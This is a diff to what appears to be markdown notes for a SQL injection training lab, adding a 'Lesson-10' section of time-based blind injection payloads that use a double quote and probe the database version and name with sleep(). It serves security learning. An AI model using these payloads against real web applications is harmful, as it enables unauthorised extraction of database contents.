@@ -86,3 +86,16 @@ Get database
 ?id=1' and if(substr(database(),1,1)='s', sleep(10),null)--+
 
 ```	
+
+### Lesson-10
+
+```	
+Similar to Lesson-9, but use double quote instead of single quote.
+
+?id=1" and sleep(10)--++
+
+?id=1" and if(substr(version(),1,1)=5, sleep(10),null)--+
+?id=1" and if(substr(database(),1,1)='s', sleep(10),null)--+
+
+
+```	
